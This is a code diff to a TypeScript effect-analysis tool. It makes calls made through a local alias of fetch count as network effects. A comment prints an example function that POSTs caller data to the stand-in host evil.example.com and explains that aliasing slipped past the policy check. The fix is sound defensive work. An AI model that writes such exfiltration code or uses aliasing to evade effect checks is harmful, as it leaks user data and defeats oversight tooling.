@@ -4981,7 +4981,42 @@ function visitCalls(node) {
   // callee — `process.*` by exact text (mirroring the process.env match), `fetch` by identifier whose
   // symbol is NOT a local declaration (so a project's own `fetch` shadow never fabricates Net).
   if (ts.isCallExpression(node)) {
-    const callee = node.expression;
+    // …AND THROUGH A LOCAL ALIAS OF THE GLOBAL, which is the spelling this block kept missing.
+    //
+    // Every test below reads the CALLEE NODE — `callee.text === "fetch"`, `ctext === "globalThis.fetch"`.
+    // `const send = fetch; send(url)` has callee `send`, so it matched nothing and the call vanished:
+    //
+    //     export async function exfil(data: string) {
+    //       const send = fetch;
+    //       await send("https://evil.example.com/collect", { method: "POST", body: data });
+    //     }
+    //     deny Net  →  exit 0, `policy ✓`, 0 effectful functions          MEASURED on published 0.29.0
+    //
+    // A POST of caller data to an external host, certified clean: the cardinal sin. It is also the THIRD
+    // spelling of one defect — the comment below records `globalThis.fetch` "read silent-pure" until it
+    // was added beside the bare identifier. Fixing the instance and not the class is what left this one.
+    //
+    // Imports were never affected (`const g = fs.readFileSync; g(p)` charges Fs, and so do the named and
+    // destructured forms) because those resolve through the symbol table. Only the GLOBALS matched here
+    // are keyed by text, so only they needed unwrapping. candor-rust and candor-swift both charge the
+    // aliased form already; this was ts alone.
+    //
+    // SHADOW-SAFE, which is the whole reason the guards below test the symbol rather than the name: the
+    // unwrap yields the INITIALIZER NODE, so `const send = fetch` where `fetch` is a project-local
+    // declaration still fails the "not declared in this project" test and fabricates nothing. Bounded to
+    // 4 hops, and only through a plain identifier/property-access initializer — a rebinding, never a
+    // computed value, so nothing here follows a function call or a conditional into a wrong answer.
+    const unaliasGlobal = (expr) => {
+      for (let hop = 0; hop < 4 && ts.isIdentifier(expr); hop++) {
+        const decl = (checker.getSymbolAtLocation(expr)?.declarations ?? [])[0];
+        if (!decl || !ts.isVariableDeclaration(decl) || !decl.initializer) return expr;
+        const init = decl.initializer;
+        if (!ts.isIdentifier(init) && !ts.isPropertyAccessExpression(init)) return expr;
+        expr = init;
+      }
+      return expr;
+    };
+    const callee = unaliasGlobal(node.expression);
     const ctext = callee.getText().replace(/\s+/g, "");
     let geff = null;
     // The member path AFTER the global `process` object, or null: `process.hrtime` → "hrtime",
